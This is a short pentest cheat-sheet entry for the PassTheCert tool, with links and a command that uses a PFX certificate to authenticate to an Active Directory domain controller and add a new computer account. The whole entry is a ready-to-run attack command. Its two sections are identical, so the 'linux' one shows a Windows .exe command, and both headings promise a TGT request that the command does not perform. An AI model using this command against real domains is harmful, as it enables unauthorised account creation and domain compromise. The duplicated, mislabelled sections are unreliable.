# passthecert

% certificate, windows, Active directory, shadow credential



## Request a TGT using a PFX (windows)
#plateform/windows #target/remote  #cat/UTILS
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html
https://github.com/AlmondOffSec/PassTheCert
```
.\PassTheCert.exe --server ad1.contoso.com --cert-path Z:\ad2.pfx --add-computer --computer-name DESKTOP-1337$
```

## Request a TGT using a PFX (linux)
#plateform/linux #target/remote  #cat/UTILS
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html
https://github.com/AlmondOffSec/PassTheCert
```
.\PassTheCert.exe --server ad1.contoso.com --cert-path Z:\ad2.pfx --add-computer --computer-name DESKTOP-1337$
```